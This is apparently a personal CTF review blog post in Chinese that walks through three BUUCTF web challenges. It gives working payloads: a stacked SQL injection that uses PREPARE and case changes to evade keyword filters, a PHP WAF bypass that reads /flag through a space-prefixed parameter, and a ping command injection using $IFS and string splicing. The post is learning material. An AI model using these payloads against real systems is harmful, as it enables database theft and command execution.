---
title: buu知识点复习
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-08-29 13:39:09
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1098162.jpg
---
比赛打下来唯一的感觉就是基础知识不扎实，所以就复习一下之前做过的题目，对我认为比较重要的知识点做一个总结。
一、[强网杯 2019]随便注--堆叠注入
原来改名称那个payload一直有问题，这里新学习了一个姿势：预编译
预编译相关语法如下：

set用于设置变量名和值
prepare用于预备一个语句，并赋予名称，以后可以引用该语句
execute执行语句
deallocate prepare用来释放掉预处理的语句

-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#

拆分开来如下
-1';
set @sql = CONCAT('se','lect * from `1919810931114514`;');
prepare stmt from @sql;
EXECUTE stmt;#

回显：
strstr($inject, "set") && strstr($inject, "prepare")

这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。

-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#

二、[RoarCTF 2019]Easy Calc--php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200829164236.png)

当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。

num被限制了，那么'  num'呢，在num前面加了空格。waf就管不着了，因为waf只是限制了num，waf并没有限制'  num'，当php解析的时候，又会把'   num'前面的空格去掉在解析，利用这点来上传非法字符。
var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))

三、[GXYCTF2019]Ping Ping Ping--命令执行变量拼接
过滤空格，可以用${IFS}$代替
过滤{}，用$IFS$1代替

ps:有时会禁用cat:
解决方法是使用tac反向输出命令：
linux命令中可以加\，所以甚至可以ca\t /fl\ag

符号：
；分号叫顺序执行


本题payload?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php

后面还有很多绕过方式，取反、自增等等，碰到的时候再去总结吧。

